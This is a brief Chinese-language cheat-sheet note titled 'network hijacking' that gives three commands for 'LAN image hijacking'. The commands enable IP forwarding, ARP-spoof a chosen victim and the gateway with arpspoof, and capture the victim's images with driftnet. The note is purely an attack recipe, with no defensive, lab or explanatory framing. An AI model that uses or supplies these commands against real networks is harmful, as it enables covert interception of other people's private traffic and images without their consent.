# 网络劫持

## 局域网图片劫持

```JS
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 网关 对方ip
driftnet -i eth0
```